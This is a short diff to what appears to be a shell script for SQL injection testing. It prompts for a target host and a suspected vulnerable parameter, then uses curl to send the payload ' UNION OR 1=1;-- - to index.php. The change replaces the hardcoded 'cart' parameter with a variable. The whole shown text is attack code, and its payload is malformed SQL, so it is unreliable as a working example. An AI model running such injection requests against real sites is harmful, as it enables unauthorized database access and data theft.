@@ -4,4 +4,4 @@
 echo "Enter the host info (ip/domain)" 
 echo "Submit the the vulnerable/suspected parameter"
 
-curl $host/index.php?cart=' UNION OR 1=1;-- -
+curl $host/index.php?{$p}=' UNION OR 1=1;-- -
